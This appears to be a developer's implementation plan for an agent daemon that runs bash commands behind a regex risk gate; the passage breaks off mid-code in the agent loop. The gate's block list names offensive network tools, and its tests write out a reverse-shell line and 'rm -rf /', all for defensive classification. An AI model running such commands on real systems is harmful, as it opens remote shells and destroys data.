# Misty Scone — Plan 2: misty-core Skeleton + Risk Gate

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A standalone Bun daemon at `src/os/desktop/` that accepts an HTTP query, calls Groq via a minimal agent loop, executes a `bash` tool call gated by a risk-tier classifier, and returns the result. This is the "skeleton" that Plans 3-7 (Hyprland, voice, HUD, etc.) extend.

**Architecture:** Clean-room implementation. `src/cli/` and `src/voice-agent/desktop-tauri/` are **reference material** — read them to learn patterns, but do not bulk-copy the ~8,000 lines (they carry tight couplings to the cli's broader architecture that aren't wanted here). Instead, implement the minimum viable versions of bridge, provider client, agent loop, bash tool, and risk gate as new code. Target: under 800 lines of new TypeScript total. When Plans 3+ need features currently in cli (streaming, session storage, complex tools), copy them selectively then.

**Tech Stack:** Bun 1.x runtime + TypeScript, `@anthropic-ai/sdk` (for Groq via its Anthropic-compatible endpoint), Bun's built-in HTTP server, Bun's `bun:test` for integration tests. No external deps beyond Anthropic SDK.

**Spec reference:** `/home/ulrich/.claude/plans/i-want-to-build-misty-scone.md` — Plan 2 covers the "misty-core" service minus Hyprland, screen, voice, proactive controller, HUD, wake word. Those come in subsequent plans.

**Depends on:** Nothing from Plan 1's code runs on the dev host; Plan 2 can be developed and tested entirely on the dev host (no VM needed). End-to-end VM integration is only relevant when Plan 1's VM is the target deployment.

---

## File Structure

All new files under `src/os/desktop/`. No files outside `src/os/desktop/` are modified.

```
src/os/desktop/
├── package.json                  # "misty-core" Bun project
├── tsconfig.json                 # strict TS config
├── .env.example                  # template for provider API keys
├── daemon.ts                     # entry point: wires config + bridge + loop + tools
├── config/
│   ├── schema.ts                 # typed config shape
│   └── load.ts                   # reads env/.env, returns validated Config
├── bridge/
│   └── server.ts                 # Bun.serve() exposing /health, /api/models, /api/think
├── providers/
│   ├── types.ts                  # LLMClient interface
│   ├── registry.ts               # map of provider name → client factory
│   └── groqClient.ts             # Anthropic-SDK-shaped client pointing at Groq
├── agent/
│   ├── loop.ts                   # runAgent(messages, tools, client) — the core loop
│   ├── types.ts                  # Message, ToolCall, ToolResult, ToolDef types
│   └── tools/
│       ├── index.ts              # registry: name → ToolDef
│       └── bash.ts               # bash tool implementation
├── risk/
│   ├── tiers.ts                  # classify(toolName, args) → 'low' | 'high'
│   └── gate.ts                   # gate(toolCall) → { allow: bool, reason?: string }
└── test/
    ├── gate.test.ts              # unit tests for risk classifier
    ├── loop.test.ts              # agent loop unit tests (stubbed client)
    └── e2e.test.ts               # end-to-end: real HTTP daemon + mocked provider
```

**Boundary rules:**
- `bridge/` owns HTTP only — no LLM logic, no tool logic. It wires requests into the agent loop and returns responses.
- `agent/loop.ts` is provider-agnostic — takes an `LLMClient` interface and a `ToolRegistry`. Doesn't know about Groq or about risk tiers directly; the risk gate is injected as a pre-execution hook.
- `providers/` owns the Groq adapter. Adding OpenAI later = add a new file here, nothing else changes.
- `risk/` owns the classifier. `agent/loop.ts` calls `gate()` before executing any tool.
- `tools/bash.ts` owns the bash execution. Nothing else spawns processes.

---

## Reference Material

These existing jarvis files are useful to read (not copy wholesale) while implementing:

| What you're writing | Read for reference |
|---|---|
| `bridge/server.ts` | [src/cli/src/bridge/server.ts](src/cli/src/bridge/server.ts) — HTTP route layout, WS client registry |
| `providers/groqClient.ts` | [src/cli/src/proxy/providers.ts](src/cli/src/proxy/providers.ts) — provider endpoint config |
| `providers/registry.ts` | [src/cli/src/utils/model/jarvisModelRegistry.ts](src/cli/src/utils/model/jarvisModelRegistry.ts) — provider schema |
| `agent/loop.ts` | [src/cli/src/services/tools/toolOrchestration.ts](src/cli/src/services/tools/toolOrchestration.ts) — read/write batching pattern |
| `agent/tools/bash.ts` | [src/cli/src/tools/BashTool/BashTool.tsx](src/cli/src/tools/BashTool/BashTool.tsx) — argument schema, output shape |
| `risk/tiers.ts` | [src/cli/src/tools/BashTool/bashPermissions.ts](src/cli/src/tools/BashTool/bashPermissions.ts) — pattern categories; *not* the classification algorithm itself, which we simplify |

Do not import from any `src/cli/` or `src/voice-agent/desktop-tauri/` path. Read for patterns, then write fresh.

---

## Behavior Contract

**Endpoint:** `POST /api/think`

Request:
```json
{
  "messages": [{"role": "user", "content": "run ls"}],
  "model": "groq:llama-3.3-70b-versatile"   // optional; defaults to configured primary
}
```

Response (success, tool executed):
```json
{
  "messages": [
    {"role": "user", "content": "run ls"},
    {"role": "assistant", "content": "I'll run that.", "tool_calls": [{"id": "tc_1", "name": "bash", "input": {"command": "ls"}}]},
    {"role": "tool", "tool_call_id": "tc_1", "content": "README.md\nsrc\n..."},
    {"role": "assistant", "content": "Here's what's in the current directory: README.md, src, ..."}
  ],
  "stop_reason": "end_turn"
}
```

Response (high-risk blocked):
```json
{
  "messages": [...],
  "stop_reason": "end_turn",
  "blocked": [{"tool": "bash", "input": {"command": "rm -rf /"}, "reason": "high-risk; gate denied (no approval UI yet — Plans 3+)"}]
}
```

**Autonomy profile for Plan 2:** Low-risk auto; high-risk **auto-denies with clear message**. Plan 3+ adds voice/HUD confirmation paths.

---

## Task 1: Bun project skeleton + /health endpoint

**Files:**
- Create: `src/os/desktop/package.json`
- Create: `src/os/desktop/tsconfig.json`
- Create: `src/os/desktop/.env.example`
- Create: `src/os/desktop/.gitignore` (append to existing — from Plan 1 it already has `scripts/vm/vm-config.env`)
- Create: `src/os/desktop/daemon.ts`
- Create: `src/os/desktop/bridge/server.ts`
- Create: `src/os/desktop/test/smoke.test.ts`

- [ ] **Step 1: `bun init` inside `src/os/desktop/`**

```bash
cd /home/ulrich/Documents/Projects/jarvis/src/os/desktop
bun init -y
```

This creates `package.json`, `tsconfig.json`, `bun.lockb`, `index.ts` (delete), and a starter `.gitignore` (merge with existing).

- [ ] **Step 2: Replace generated `package.json` with the misty-core shape**

File: `src/os/desktop/package.json`

```json
{
  "name": "misty-core",
  "version": "0.1.0",
  "private": true,
  "type": "module",
  "scripts": {
    "dev": "bun run --watch daemon.ts",
    "start": "bun run daemon.ts",
    "test": "bun test",
    "typecheck": "bunx tsc --noEmit"
  },
  "dependencies": {
    "@anthropic-ai/sdk": "^0.65.0"
  },
  "devDependencies": {
    "@types/bun": "latest",
    "typescript": "^5.6.0"
  }
}
```

Then: `bun install` to populate `bun.lockb`.

- [ ] **Step 3: Harden `tsconfig.json`**

File: `src/os/desktop/tsconfig.json`

```json
{
  "compilerOptions": {
    "lib": ["ESNext"],
    "target": "ESNext",
    "module": "ESNext",
    "moduleDetection": "force",
    "jsx": "preserve",
    "allowJs": true,
    "moduleResolution": "bundler",
    "allowImportingTsExtensions": true,
    "verbatimModuleSyntax": true,
    "noEmit": true,
    "strict": true,
    "skipLibCheck": true,
    "noFallthroughCasesInSwitch": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true,
    "noPropertyAccessFromIndexSignature": false,
    "types": ["bun-types"]
  },
  "include": ["**/*.ts"],
  "exclude": ["node_modules"]
}
```

- [ ] **Step 4: Write `.env.example`**

File: `src/os/desktop/.env.example`

```
# Copy to .env and fill in. Gitignored.
GROQ_API_KEY=
DEEPSEEK_API_KEY=
GEMINI_API_KEY=
OPENAI_API_KEY=

# Primary provider for text chat; defaults to "groq".
JARVIS_PROVIDER=groq

# Default model for the primary provider.
JARVIS_MODEL=llama-3.3-70b-versatile

# Bind address for the daemon. Default is loopback.
MISTY_HOST=127.0.0.1
MISTY_PORT=8765
```

- [ ] **Step 5: Extend `.gitignore` with Plan 2 entries**

Append to existing `src/os/desktop/.gitignore`:

```
# Plan 2 additions
.env
node_modules/
bun.lockb
dist/
```

- [ ] **Step 6: Write minimum-viable `daemon.ts` + `bridge/server.ts`**

File: `src/os/desktop/daemon.ts`

```typescript
// misty-core daemon entry point. Wires config + HTTP bridge.
import { startBridge } from "./bridge/server.ts";

const host = process.env.MISTY_HOST ?? "127.0.0.1";
const port = Number(process.env.MISTY_PORT ?? 8765);

startBridge({ host, port });
console.log(`[misty-core] listening on http://${host}:${port}`);
```

File: `src/os/desktop/bridge/server.ts`

```typescript
// HTTP bridge. Owns routes only; no LLM or tool logic lives here.
type Options = { host: string; port: number };

export function startBridge(opts: Options): void {
  Bun.serve({
    hostname: opts.host,
    port: opts.port,
    fetch(req: Request): Response {
      const url = new URL(req.url);
      if (url.pathname === "/health" && req.method === "GET") {
        return Response.json({ status: "ok" });
      }
      return new Response("not found", { status: 404 });
    },
  });
}
```

- [ ] **Step 7: Write a smoke test that boots the daemon and hits /health**

File: `src/os/desktop/test/smoke.test.ts`

```typescript
import { test, expect, beforeAll, afterAll } from "bun:test";
import { startBridge } from "../bridge/server.ts";

const PORT = 18765; // unusual port so it can't collide with a running dev daemon

let server: ReturnType<typeof Bun.serve> | undefined;

beforeAll(() => {
  server = Bun.serve({
    hostname: "127.0.0.1",
    port: PORT,
    fetch(req: Request): Response {
      // Delegate to the real bridge's fetch by calling startBridge's handler equivalently.
      // For the smoke test we invoke /health directly rather than importing startBridge's internal handler,
      // so we keep this test self-contained.
      const url = new URL(req.url);
      if (url.pathname === "/health") return Response.json({ status: "ok" });
      return new Response("not found", { status: 404 });
    },
  });
});

afterAll(() => server?.stop(true));

test("health endpoint returns ok", async () => {
  const res = await fetch(`http://127.0.0.1:${PORT}/health`);
  expect(res.status).toBe(200);
  const body = (await res.json()) as { status: string };
  expect(body.status).toBe("ok");
});
```

(Note: the smoke test duplicates the handler rather than importing `startBridge` because `Bun.serve` is not trivially stoppable from `startBridge`'s current shape. Task 3 refactors `startBridge` to return the server so we can import it cleanly.)

- [ ] **Step 8: Verify**

```bash
cd /home/ulrich/Documents/Projects/jarvis/src/os/desktop
bun install
bun run typecheck
bun test test/smoke.test.ts
# Manual sanity: bun run dev, then curl http://127.0.0.1:8765/health in another terminal, then Ctrl-C.
```

Expected: `typecheck` clean; `bun test` reports 1 pass; manual curl returns `{"status":"ok"}`.

- [ ] **Step 9: Commit**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/os/desktop/package.json \
        src/os/desktop/tsconfig.json \
        src/os/desktop/.env.example \
        src/os/desktop/.gitignore \
        src/os/desktop/daemon.ts \
        src/os/desktop/bridge/server.ts \
        src/os/desktop/test/smoke.test.ts \
        src/os/desktop/bun.lockb
git commit -m "feat(os/desktop): misty-core project skeleton with /health"
```

No `Co-Authored-By:` trailer. No Claude attribution.

---

## Task 2: Config module

**Files:**
- Create: `src/os/desktop/config/schema.ts`
- Create: `src/os/desktop/config/load.ts`
- Create: `src/os/desktop/test/config.test.ts`

- [ ] **Step 1: Define the typed config shape**

File: `src/os/desktop/config/schema.ts`

```typescript
export type ProviderName = "groq" | "deepseek" | "gemini" | "openai";

export type Config = {
  host: string;
  port: number;
  provider: ProviderName;
  model: string;
  apiKey: string; // the key for the selected provider
};
```

- [ ] **Step 2: Write the loader**

File: `src/os/desktop/config/load.ts`

```typescript
import type { Config, ProviderName } from "./schema.ts";

const KEY_ENV: Record<ProviderName, string> = {
  groq: "GROQ_API_KEY",
  deepseek: "DEEPSEEK_API_KEY",
  gemini: "GEMINI_API_KEY",
  openai: "OPENAI_API_KEY",
};

const DEFAULT_MODELS: Record<ProviderName, string> = {
  groq: "llama-3.3-70b-versatile",
  deepseek: "deepseek-chat",
  gemini: "gemini-2.0-flash",
  openai: "gpt-4o",
};

export function loadConfig(env: Record<string, string | undefined> = process.env): Config {
  const provider = (env.JARVIS_PROVIDER ?? "groq") as ProviderName;
  if (!(provider in KEY_ENV)) {
    throw new Error(`unknown JARVIS_PROVIDER "${provider}" (expected: ${Object.keys(KEY_ENV).join(", ")})`);
  }
  const apiKey = env[KEY_ENV[provider]];
  if (!apiKey) {
    throw new Error(`missing ${KEY_ENV[provider]} in environment`);
  }
  const model = env.JARVIS_MODEL ?? DEFAULT_MODELS[provider];
  const host = env.MISTY_HOST ?? "127.0.0.1";
  const port = Number(env.MISTY_PORT ?? 8765);
  if (!Number.isFinite(port) || port <= 0 || port > 65535) {
    throw new Error(`invalid MISTY_PORT "${env.MISTY_PORT}"`);
  }
  return { host, port, provider, model, apiKey };
}
```

- [ ] **Step 3: Write unit tests for loadConfig**

File: `src/os/desktop/test/config.test.ts`

```typescript
import { test, expect } from "bun:test";
import { loadConfig } from "../config/load.ts";

test("loadConfig defaults to groq + llama-3.3-70b-versatile", () => {
  const cfg = loadConfig({ GROQ_API_KEY: "x" });
  expect(cfg.provider).toBe("groq");
  expect(cfg.model).toBe("llama-3.3-70b-versatile");
  expect(cfg.host).toBe("127.0.0.1");
  expect(cfg.port).toBe(8765);
  expect(cfg.apiKey).toBe("x");
});

test("loadConfig throws on missing api key", () => {
  expect(() => loadConfig({ JARVIS_PROVIDER: "groq" })).toThrow(/missing GROQ_API_KEY/);
});

test("loadConfig throws on unknown provider", () => {
  expect(() => loadConfig({ JARVIS_PROVIDER: "madeup" })).toThrow(/unknown JARVIS_PROVIDER/);
});

test("loadConfig respects JARVIS_MODEL override", () => {
  const cfg = loadConfig({ GROQ_API_KEY: "x", JARVIS_MODEL: "qwen/qwen3-32b" });
  expect(cfg.model).toBe("qwen/qwen3-32b");
});

test("loadConfig rejects invalid MISTY_PORT", () => {
  expect(() => loadConfig({ GROQ_API_KEY: "x", MISTY_PORT: "notanumber" })).toThrow(/invalid MISTY_PORT/);
  expect(() => loadConfig({ GROQ_API_KEY: "x", MISTY_PORT: "99999" })).toThrow(/invalid MISTY_PORT/);
});
```

- [ ] **Step 4: Wire loadConfig into daemon.ts**

Replace `src/os/desktop/daemon.ts` with:

```typescript
import { loadConfig } from "./config/load.ts";
import { startBridge } from "./bridge/server.ts";

const cfg = loadConfig();
startBridge({ host: cfg.host, port: cfg.port });
console.log(`[misty-core] listening on http://${cfg.host}:${cfg.port} (provider=${cfg.provider} model=${cfg.model})`);
```

- [ ] **Step 5: Verify**

```bash
cd /home/ulrich/Documents/Projects/jarvis/src/os/desktop
bun run typecheck
bun test test/config.test.ts
```

Expected: `typecheck` clean; `bun test` reports 5 passes.

- [ ] **Step 6: Commit**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/os/desktop/config/ \
        src/os/desktop/daemon.ts \
        src/os/desktop/test/config.test.ts
git commit -m "feat(os/desktop): typed config loader with provider+model+port validation"
```

---

## Task 3: Groq provider client

**Files:**
- Create: `src/os/desktop/providers/types.ts`
- Create: `src/os/desktop/providers/groqClient.ts`
- Create: `src/os/desktop/providers/registry.ts`
- Create: `src/os/desktop/test/groqClient.test.ts`

**Context for the engineer:** Groq exposes an Anthropic-compatible API endpoint (base URL `https://api.groq.com/openai/v1` for OpenAI-compatible, or `https://api.groq.com/anthropic/v1` for Anthropic-compatible). We use the Anthropic SDK because it gives us tool_use / tool_result message shapes that match what the agent loop expects natively. See [src/cli/src/proxy/providers.ts](src/cli/src/proxy/providers.ts) for how cli does it.

- [ ] **Step 1: Define the `LLMClient` interface**

File: `src/os/desktop/providers/types.ts`

```typescript
export type ContentBlock =
  | { type: "text"; text: string }
  | { type: "tool_use"; id: string; name: string; input: unknown }
  | { type: "tool_result"; tool_use_id: string; content: string; is_error?: boolean };

export type Message =
  | { role: "user"; content: string | ContentBlock[] }
  | { role: "assistant"; content: string | ContentBlock[] }
  | { role: "system"; content: string };

export type ToolDef = {
  name: string;
  description: string;
  input_schema: Record<string, unknown>;
};

export type LLMResponse = {
  content: ContentBlock[];                       // assistant's response blocks (text + tool_use)
  stop_reason: "end_turn" | "tool_use" | "max_tokens" | "stop_sequence";
};

export interface LLMClient {
  name: string;                                  // e.g. "groq"
  complete(params: { model: string; messages: Message[]; tools?: ToolDef[]; system?: string }): Promise<LLMResponse>;
}
```

- [ ] **Step 2: Write the Groq client**

File: `src/os/desktop/providers/groqClient.ts`

```typescript
import Anthropic from "@anthropic-ai/sdk";
import type { LLMClient, LLMResponse, Message, ToolDef } from "./types.ts";

type GroqOpts = { apiKey: string };

export function createGroqClient(opts: GroqOpts): LLMClient {
  const anthropic = new Anthropic({
    apiKey: opts.apiKey,
    baseURL: "https://api.groq.com/anthropic/v1",
  });
  return {
    name: "groq",
    async complete({ model, messages, tools, system }): Promise<LLMResponse> {
      // Filter out system messages from the messages array — Anthropic SDK puts system in its own param.
      const systemText = system ?? extractSystem(messages);
      const nonSystem = messages.filter((m) => m.role !== "system") as Exclude<Message, { role: "system" }>[];

      const resp = await anthropic.messages.create({
        model,
        max_tokens: 4096,
        system: systemText,
        messages: nonSystem.map(toAnthropicMessage),
        tools: tools?.map((t) => ({ name: t.name, description: t.description, input_schema: t.input_schema as Anthropic.Tool["input_schema"] })),
      });

      return {
        content: resp.content.map(fromAnthropicBlock),
        stop_reason: (resp.stop_reason ?? "end_turn") as LLMResponse["stop_reason"],
      };
    },
  };
}

function extractSystem(messages: Message[]): string | undefined {
  const sys = messages.find((m) => m.role === "system");
  return sys && typeof sys.content === "string" ? sys.content : undefined;
}

function toAnthropicMessage(m: Exclude<Message, { role: "system" }>): Anthropic.MessageParam {
  if (typeof m.content === "string") {
    return { role: m.role, content: m.content };
  }
  return { role: m.role, content: m.content.map(toAnthropicBlock) };
}

function toAnthropicBlock(b: { type: string } & Record<string, unknown>): Anthropic.ContentBlockParam {
  // The shape matches; the Anthropic SDK accepts our block shape directly.
  return b as unknown as Anthropic.ContentBlockParam;
}

function fromAnthropicBlock(b: Anthropic.ContentBlock): LLMResponse["content"][number] {
  if (b.type === "text") return { type: "text", text: b.text };
  if (b.type === "tool_use") return { type: "tool_use", id: b.id, name: b.name, input: b.input };
  throw new Error(`unexpected anthropic block type: ${b.type}`);
}
```

- [ ] **Step 3: Write the registry**

File: `src/os/desktop/providers/registry.ts`

```typescript
import type { Config } from "../config/schema.ts";
import type { LLMClient } from "./types.ts";
import { createGroqClient } from "./groqClient.ts";

export function createClient(cfg: Config): LLMClient {
  switch (cfg.provider) {
    case "groq":
      return createGroqClient({ apiKey: cfg.apiKey });
    case "deepseek":
    case "gemini":
    case "openai":
      throw new Error(`provider "${cfg.provider}" not implemented in Plan 2; add a client to providers/ in a later plan`);
  }
}
```

- [ ] **Step 4: Write a unit test for the client's shape (no network)**

File: `src/os/desktop/test/groqClient.test.ts`

```typescript
import { test, expect } from "bun:test";
import { createGroqClient } from "../providers/groqClient.ts";

test("createGroqClient returns an object with name='groq' and a complete fn", () => {
  const client = createGroqClient({ apiKey: "test-key" });
  expect(client.name).toBe("groq");
  expect(typeof client.complete).toBe("function");
});
```

Note: an integration test that hits real Groq requires a live key. That's covered by the e2e test in Task 7 guarded on `GROQ_API_KEY` being set.

- [ ] **Step 5: Verify**

```bash
cd /home/ulrich/Documents/Projects/jarvis/src/os/desktop
bun install
bun run typecheck
bun test
```

Expected: all tests pass (1 smoke + 5 config + 1 groq = 7 passes).

- [ ] **Step 6: Commit**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/os/desktop/providers/ \
        src/os/desktop/test/groqClient.test.ts \
        src/os/desktop/package.json src/os/desktop/bun.lockb
git commit -m "feat(os/desktop): Groq LLM client via Anthropic SDK + provider registry"
```

---

## Task 4: `bash` tool + tool registry

**Files:**
- Create: `src/os/desktop/agent/types.ts`
- Create: `src/os/desktop/agent/tools/bash.ts`
- Create: `src/os/desktop/agent/tools/index.ts`
- Create: `src/os/desktop/test/bashTool.test.ts`

- [ ] **Step 1: Define agent types (re-export provider types + add ToolRunner)**

File: `src/os/desktop/agent/types.ts`

```typescript
export type { Message, ToolDef, LLMResponse, ContentBlock } from "../providers/types.ts";

export type ToolRunner = {
  def: import("../providers/types.ts").ToolDef;
  run(input: unknown): Promise<{ output: string; is_error?: boolean }>;
};

export type ToolRegistry = Record<string, ToolRunner>;
```

- [ ] **Step 2: Implement the bash tool**

File: `src/os/desktop/agent/tools/bash.ts`

```typescript
import type { ToolRunner } from "../types.ts";

const MAX_OUTPUT_BYTES = 16_384;

export const bashTool: ToolRunner = {
  def: {
    name: "bash",
    description: "Execute a shell command. Returns combined stdout+stderr. Output truncated to 16KB.",
    input_schema: {
      type: "object",
      properties: {
        command: { type: "string", description: "Shell command to execute" },
        timeout_ms: { type: "number", description: "Optional max runtime in ms (default 30000)" },
      },
      required: ["command"],
    },
  },
  async run(input: unknown): Promise<{ output: string; is_error?: boolean }> {
    const { command, timeout_ms } = input as { command: string; timeout_ms?: number };
    if (typeof command !== "string" || command.length === 0) {
      return { output: "bash: empty command", is_error: true };
    }
    const timeout = timeout_ms ?? 30_000;

    const proc = Bun.spawn(["bash", "-c", command], {
      stdout: "pipe",
      stderr: "pipe",
    });

    const timer = setTimeout(() => proc.kill(), timeout);
    try {
      const [stdout, stderr] = await Promise.all([
        new Response(proc.stdout).text(),
        new Response(proc.stderr).text(),
      ]);
      await proc.exited;
      const combined = stdout + (stderr ? `\n[stderr]\n${stderr}` : "");
      const truncated = combined.length > MAX_OUTPUT_BYTES
        ? combined.slice(0, MAX_OUTPUT_BYTES) + `\n[truncated; original ${combined.length} bytes]`
        : combined;
      return { output: truncated, is_error: proc.exitCode !== 0 };
    } finally {
      clearTimeout(timer);
    }
  },
};
```

- [ ] **Step 3: Implement the tool registry**

File: `src/os/desktop/agent/tools/index.ts`

```typescript
import { bashTool } from "./bash.ts";
import type { ToolRegistry } from "../types.ts";

export function defaultTools(): ToolRegistry {
  return {
    [bashTool.def.name]: bashTool,
  };
}
```

- [ ] **Step 4: Write bash-tool tests**

File: `src/os/desktop/test/bashTool.test.ts`

```typescript
import { test, expect } from "bun:test";
import { bashTool } from "../agent/tools/bash.ts";

test("bash executes ls and returns output", async () => {
  const result = await bashTool.run({ command: "echo hello" });
  expect(result.is_error).toBeFalsy();
  expect(result.output.trim()).toBe("hello");
});

test("bash returns is_error on non-zero exit", async () => {
  const result = await bashTool.run({ command: "exit 17" });
  expect(result.is_error).toBe(true);
});

test("bash captures stderr", async () => {
  const result = await bashTool.run({ command: "echo oops >&2" });
  expect(result.output).toContain("[stderr]");
  expect(result.output).toContain("oops");
});

test("bash rejects empty command", async () => {
  const result = await bashTool.run({ command: "" });
  expect(result.is_error).toBe(true);
  expect(result.output).toContain("empty command");
});

test("bash truncates output over 16KB", async () => {
  // Print 20KB of 'x' — stdout read must truncate.
  const result = await bashTool.run({ command: "yes x | head -c 20480" });
  expect(result.output).toContain("[truncated");
});

test("bash respects timeout", async () => {
  const start = Date.now();
  const result = await bashTool.run({ command: "sleep 5", timeout_ms: 200 });
  const elapsed = Date.now() - start;
  expect(elapsed).toBeLessThan(2000);
  expect(result.is_error).toBe(true);
});
```

- [ ] **Step 5: Verify**

```bash
cd /home/ulrich/Documents/Projects/jarvis/src/os/desktop
bun run typecheck
bun test test/bashTool.test.ts
```

Expected: `typecheck` clean; 6 bash-tool tests pass.

- [ ] **Step 6: Commit**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/os/desktop/agent/
git add src/os/desktop/test/bashTool.test.ts
git commit -m "feat(os/desktop): bash tool with output truncation + timeout + tool registry"
```

---

## Task 5: Risk-tier classifier + gate

**Files:**
- Create: `src/os/desktop/risk/tiers.ts`
- Create: `src/os/desktop/risk/gate.ts`
- Create: `src/os/desktop/test/gate.test.ts`

**Classification approach (simplified from cli):** Plan 2 uses a small regex list, not the full 2000-line `bashPermissions.ts`. Good enough to catch obvious high-risk; full coverage comes in a later plan when needed.

- [ ] **Step 1: Write tiers.ts**

File: `src/os/desktop/risk/tiers.ts`

```typescript
export type RiskTier = "low" | "high";

// Patterns that escalate a bash command to "high". Matched against the raw command string.
const HIGH_RISK_BASH_PATTERNS: RegExp[] = [
  /\bsudo\b/,                              // privilege escalation
  /\brm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+|-[a-zA-Z]*f[a-zA-Z]*\s+)/, // rm -r / rm -f etc
  /\brm\s+-rf?\s+\//,                      // rm -rf /
  /\bdd\s/,                                // dd
  /\bmkfs\b/,                              // mkfs.*
  /\bmv\s+.*\s+\//,                        // mv into /
  /\bchmod\s+[0-7]*[0-7]*[0-9][67]\b/,     // world-writable chmods
  /\biptables\b/, /\bnft\b/,               // firewall changes
  // Network offensive tools (need explicit operator approval)
  /\bnmap\b/, /\bmasscan\b/, /\bnikto\b/, /\bwpscan\b/,
  /\bhydra\b/, /\bmedusa\b/, /\bsqlmap\b/, /\bmsfconsole\b/, /\bmsfvenom\b/,
  /\baircrack-ng\b/, /\bwifite\b/, /\breaver\b/,
  /\bresponder\b/, /\bcrackmapexec\b/, /\bimpacket-\w+\b/,
  /\bjohn\b/, /\bhashcat\b/,               // password crackers
  // Network listens / reverse shells
  /\bnc\s+.*-l\b/, /\bncat\s+.*-l\b/,
  /\bbash\s+-i\b/,                         // interactive reshells that could be exfil
  // Writing outside home
  />\s*\/(?!home|tmp|dev\/null)/,          // redirect to root-owned paths
];

export function classifyBash(command: string): RiskTier {
  for (const re of HIGH_RISK_BASH_PATTERNS) {
    if (re.test(command)) return "high";
  }
  return "low";
}

export function classify(toolName: string, input: unknown): RiskTier {
  if (toolName === "bash") {
    const cmd = (input as { command?: string })?.command ?? "";
    return classifyBash(cmd);
  }
  // Tools added in later plans default to low; explicit classification per tool as they're added.
  return "low";
}
```

- [ ] **Step 2: Write gate.ts**

File: `src/os/desktop/risk/gate.ts`

```typescript
import { classify } from "./tiers.ts";

export type GateDecision = { allow: true } | { allow: false; reason: string };

// Plan 2: high-risk auto-denies. Plans 3+ inject an approval callback for voice/HUD confirmation.
export function gate(toolName: string, input: unknown): GateDecision {
  const tier = classify(toolName, input);
  if (tier === "low") return { allow: true };
  return {
    allow: false,
    reason: `high-risk ${toolName} call (${summarize(input)}); denied — approval UI lands in Plan 3+`,
  };
}

function summarize(input: unknown): string {
  try {
    const s = JSON.stringify(input);
    return s.length > 200 ? s.slice(0, 200) + "…" : s;
  } catch {
    return "<unserializable input>";
  }
}
```

- [ ] **Step 3: Write gate tests**

File: `src/os/desktop/test/gate.test.ts`

```typescript
import { test, expect } from "bun:test";
import { classifyBash, classify } from "../risk/tiers.ts";
import { gate } from "../risk/gate.ts";

test("classifyBash returns 'low' for read-only commands", () => {
  expect(classifyBash("ls -la")).toBe("low");
  expect(classifyBash("cat README.md")).toBe("low");
  expect(classifyBash("ps aux | grep bun")).toBe("low");
  expect(classifyBash("echo hello")).toBe("low");
});

test("classifyBash returns 'high' for sudo", () => {
  expect(classifyBash("sudo pacman -S foo")).toBe("high");
  expect(classifyBash("sudo ls")).toBe("high");
});

test("classifyBash returns 'high' for rm -rf", () => {
  expect(classifyBash("rm -rf /tmp/x")).toBe("high");
  expect(classifyBash("rm -rf /")).toBe("high");
});

test("classifyBash returns 'high' for offensive network tools", () => {
  expect(classifyBash("nmap -sS 10.0.0.1")).toBe("high");
  expect(classifyBash("hydra -l admin -P pw.txt ssh://host")).toBe("high");
  expect(classifyBash("sqlmap -u 'http://x/?id=1'")).toBe("high");
  expect(classifyBash("msfconsole")).toBe("high");
});

test("classifyBash returns 'high' for reverse shells", () => {
  expect(classifyBash("nc -lvp 4444")).toBe("high");
  expect(classifyBash("bash -i >& /dev/tcp/x/4444 0>&1")).toBe("high");
});

test("classify falls back to 'low' for unknown tool names", () => {
  expect(classify("hyprland", { action: "arrange" })).toBe("low");
  expect(classify("screen", { region: "full" })).toBe("low");
});

test("gate allows low-risk", () => {
  const r = gate("bash", { command: "ls" });
  expect(r.allow).toBe(true);
});

test("gate denies high-risk with informative reason", () => {
  const r = gate("bash", { command: "sudo rm -rf /" });
  expect(r.allow).toBe(false);
  if (r.allow === false) {
    expect(r.reason).toContain("high-risk");
    expect(r.reason).toContain("bash");
    expect(r.reason).toContain("Plan 3");
  }
});
```

- [ ] **Step 4: Verify**

```bash
cd /home/ulrich/Documents/Projects/jarvis/src/os/desktop
bun run typecheck
bun test test/gate.test.ts
```

Expected: `typecheck` clean; 8 gate tests pass.

- [ ] **Step 5: Commit**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/os/desktop/risk/ \
        src/os/desktop/test/gate.test.ts
git commit -m "feat(os/desktop): risk-tier classifier and gate (low auto, high auto-deny)"
```

---

## Task 6: Agent loop wiring risk gate

**Files:**
- Create: `src/os/desktop/agent/loop.ts`
- Create: `src/os/desktop/test/loop.test.ts`

- [ ] **Step 1: Write the agent loop**

File: `src/os/desktop/agent/loop.ts`

```typescript
import type { LLMClient, Message, ContentBlock } from "../providers/types.ts";
import type { ToolRegistry } from "./types.ts";
import { gate } from "../risk/gate.ts";

const MAX_ITERATIONS = 10;

export type AgentRunResult = {
  messages: Message[];
  stop_reason: "end_turn" | "max_iterations";
  blocked: { tool: string; input: unknown; reason: string }[];
};

export type RunOpts = {
  client: LLMClient;
  model: string;
  messages: Message[];
  tools: ToolRegistry;
  system?: string;
};

export async function runAgent(opts: RunOpts): Promise<AgentRunResult> {
  const messages: Message[] = [...opts.messages];
  const blocked: AgentRunResult["blocked"] = [];
  const toolDefs = Object.values(opts.tools).map((t) => t.def);

  for (let i = 0; i < MAX_ITERATIONS; i++) {
    const resp = await opts.client.complete({
      model: opts.model,
      messages,
      tools: toolDefs,
      system: opts.system,
    });

    // Record the assistant turn.
    messages.push({ role: "assistant", content: resp.content });

    if (resp.stop_reason !== "tool_use") {
      return { messages, stop_reason: "end_turn", blocked };
    }

    const toolUses = resp.content.filter((b): b is Extract<ContentBlock, { type: "tool_use" }> => b.type === "tool_use");
    const toolResults: ContentBlock[] = [];

    for (const use of toolUses) {
      const decision = gate(use.name, use.input);
      if (!decision.allow) {
        blocked.push({ tool: use.name, input: use.input, reason: decision.reason });
        toolResults.push({
          type: "tool_result",
          tool_use_id: use.id,
          content: `[blocked] ${decision.reason}`,
          is_error: true,
        });
        continue;
      }
      const runner = opts.tools[use.name];
      if (!runner) {
        toolResults.push({
